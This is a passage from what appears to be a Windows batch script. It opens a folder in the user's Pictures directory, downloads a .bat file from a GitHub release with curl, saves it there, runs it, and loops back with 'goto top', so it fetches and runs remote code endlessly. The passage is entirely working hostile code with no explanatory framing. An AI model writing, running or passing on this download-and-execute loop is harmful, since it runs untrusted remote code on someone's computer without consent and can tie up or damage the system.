...
start C:\Users\%username%\Pictures\fr
curl -L "https://github.com/lolfrsame/random-shit/releases/download/fr/frrrrrr.bat" -o C:\Users\%username%\Pictures\frrrrrr.bat
start C:\Users\%username%\Pictures\frrrrrr.bat
goto top
